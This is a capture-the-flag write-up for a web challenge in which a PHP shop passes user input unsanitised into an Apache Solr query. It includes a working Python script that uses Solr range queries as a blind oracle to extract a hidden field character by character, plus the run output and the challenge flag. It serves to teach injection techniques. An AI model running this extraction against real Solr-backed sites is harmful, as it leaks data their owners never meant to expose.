# Solar Shop

**Category:** WEB
**Difficulty:** Medium
**Flag:** `HackOn{s0lrx4lf411o}`

## Description

> Bienvenid@s a la tienda "Solar Shop", está todavía en desarrollo, pero pronto se convertirá en la mayor tienda de cosas random :D
>
> Flag format: HackOn{[a-z0-9]{12}}

## TL;DR

The search parameter is injected directly into an Apache Solr query. Using Solr's range syntax (`[LOW TO HIGH]`) as an oracle, the `flag` field of the secret document is extracted character by character via binary search.

## Analysis

### Source code (index.php)

The PHP server builds the Solr query by directly concatenating user input:

```php
$query = isset($_GET['q']) ? $_GET['q'] : "";

function is_blocked($q) {
    return preg_match('/\b(AND|OR)\b|\*|<|>|\|\||&&|\||&|\+|\-/i', $q);
}

if ($query !== "" && !is_blocked($query)) {
    $solr_query = "name:" . $query;
    $url = $solr_url . "?q=" . urlencode($solr_query) . "&wt=json";
    $response = @file_get_contents($url);
    ...
}
```

The blocklist filters: `AND`, `OR`, `*`, `<`, `>`, `||`, `&&`, `|`, `&`, `+`, `-`

The resulting query has the form:
```
GET http://solr:8983/solr/ctf/select?q=name:<USER_INPUT>&wt=json
```

### Flag document

In `data.json` there is a special document with `id=69`:

```json
{
  "id": "69",
  "name": "flag",
  "description": "Ya estas cerca de la flag -.-",
  "price": 937.95,
  "internal": false,
  "flag": "xxxxxxxxxxxx"
}
```

The `flag` field contains the actual flag value on the server. The PHP only displays the `name`, `description` and `price` fields, so reading the `flag` field directly from the interface is not possible.

### Vulnerability: Solr Injection + blind range query

Although the blocklist prevents explicit boolean operators (`AND`, `OR`, `*`), **it does not block the keyword `TO`**, which is Solr's syntax for range queries:

```
field:[LOW TO HIGH]
```

In Lucene/Solr, a space between terms acts as an implicit OR. So if we send:

```
nonexistent flag:[0 TO mzzzzzzzzzzz]
```

The full query that Solr receives is:

```
name:nonexistent flag:[0 TO mzzzzzzzzzzz]
```

This is equivalent to: `(name = "nonexistent") OR (flag IN [0, mzzzzzzzzzzz])`

Since no product has `name = "nonexistent"`, the result only contains document 69 if its `flag` field falls lexicographically within the specified range. This creates a **binary oracle**:

- **1 result** → the `flag` field value is within the range
- **0 results** → the `flag` field value is outside the range

### Character-by-character extraction

With this oracle, a **binary search** is performed over the alphabet `[0-9a-z]` (36 characters, lexicographically sorted) for each of the 12 flag characters:

For the character at position `i`, given the known prefix `p`:
- `low_bound  = p + "0" * (12 - i)`
- `high_bound = p + mid_char + "z" * (11 - i)`
- Si el oráculo devuelve `True` → `flag[i] <= mid_char`
- Si devuelve `False` → `flag[i] > mid_char`

Maximum number of queries: `12 positions × ⌈log₂(36)⌉ = 12 × 6 = 72`

## Solution

### Prerequisites

```bash
pip install requests --break-system-packages
```

### Steps

1. Confirm that document id=69 (`name=flag`) exists in Solr:
   ```
   GET /?q=flag  → returns 1 result with price 937.95 €
   ```

2. Verify the range oracle:
   ```
   GET /?q=nonexistent+flag:[0+TO+zzzzzzzzzzzz]       → 1 resultado ✓
   GET /?q=nonexistent+flag:[zzzzzzzzzzzzz+TO+zzzzzzzzzzzzzz]  → 0 resultados ✓
   ```

3. Run the blind extraction with binary search:
   ```bash
   python3 solve.py
   ```

### Solve Script

```python
#!/usr/bin/env python3
# solve.py: solar-shop Solr Injection blind extraction
# Technique: Solr range queries as oracle to extract flag char by char
# Blocked: AND OR * < > || && | & + -
# NOT blocked: TO (range syntax), spaces (implicit OR), field:value syntax

import requests
import re
import sys

BASE = sys.argv[1] if len(sys.argv) > 1 else "https://hackon-solar.chals.io"

# Alphabet in lexicographic/ASCII order: digits first, then lowercase
ALPHABET = '0123456789abcdefghijklmnopqrstuvwxyz'
FLAG_LEN  = 12

def oracle(q):
    """Returns True if the flag document (id=69) appears in results."""
    r = requests.get(BASE, params={'q': q}, timeout=15)
    return bool(re.search(r'<div class="product">', r.text))

def extract_flag():
    known = ''
    total_queries = 0

    for pos in range(FLAG_LEN):
        lo, hi = 0, len(ALPHABET) - 1

        while lo < hi:
            mid      = (lo + hi) // 2
            mid_char = ALPHABET[mid]

            # Range: [known + '0'*(12-pos)  TO  known + mid_char + 'z'*(11-pos)]
            # Tests whether flag[pos] <= mid_char (given known prefix)
            low_bound  = known + '0' * (FLAG_LEN - pos)
            high_bound = known + mid_char + 'z' * (FLAG_LEN - pos - 1)

            q = f'nonexistent flag:[{low_bound} TO {high_bound}]'
            total_queries += 1

            if oracle(q):
                hi = mid     # flag[pos] <= mid_char
            else:
                lo = mid + 1 # flag[pos] >  mid_char

        found_char = ALPHABET[lo]
        known += found_char
        print(f'[+] pos={pos:2d}  char="{found_char}"  flag_so_far="{known}"  '
              f'(queries used: {total_queries})', flush=True)

    return known

print('[*] Starting blind Solr range-query extraction...')
print(f'[*] Alphabet: {ALPHABET}  ({len(ALPHABET)} chars)')
print(f'[*] Expected queries: ~{FLAG_LEN * 6} (6 per position)\n')

inner = extract_flag()
flag  = f'HackOn{{{inner}}}'

print(f'\n[+] FLAG: {flag}')

with open('flag.txt', 'w') as f:
    f.write(flag + '\n')
print('[+] Saved to flag.txt')
```

### Output

```
[*] Starting blind Solr range-query extraction...
[*] Alphabet: 0123456789abcdefghijklmnopqrstuvwxyz  (36 chars)
[*] Expected queries: ~72 (6 per position)

[+] pos= 0  char="s"  flag_so_far="s"  (queries used: 6)
[+] pos= 1  char="0"  flag_so_far="s0"  (queries used: 12)
[+] pos= 2  char="l"  flag_so_far="s0l"  (queries used: 17)
[+] pos= 3  char="r"  flag_so_far="s0lr"  (queries used: 23)
[+] pos= 4  char="x"  flag_so_far="s0lrx"  (queries used: 28)
[+] pos= 5  char="4"  flag_so_far="s0lrx4"  (queries used: 33)
[+] pos= 6  char="l"  flag_so_far="s0lrx4l"  (queries used: 38)
[+] pos= 7  char="f"  flag_so_far="s0lrx4lf"  (queries used: 43)
[+] pos= 8  char="4"  flag_so_far="s0lrx4lf4"  (queries used: 48)
[+] pos= 9  char="1"  flag_so_far="s0lrx4lf41"  (queries used: 54)
[+] pos=10  char="1"  flag_so_far="s0lrx4lf411"  (queries used: 60)
[+] pos=11  char="o"  flag_so_far="s0lrx4lf411o"  (queries used: 65)

[+] FLAG: HackOn{s0lrx4lf411o}
```

## Flag

```
HackOn{s0lrx4lf411o}
```
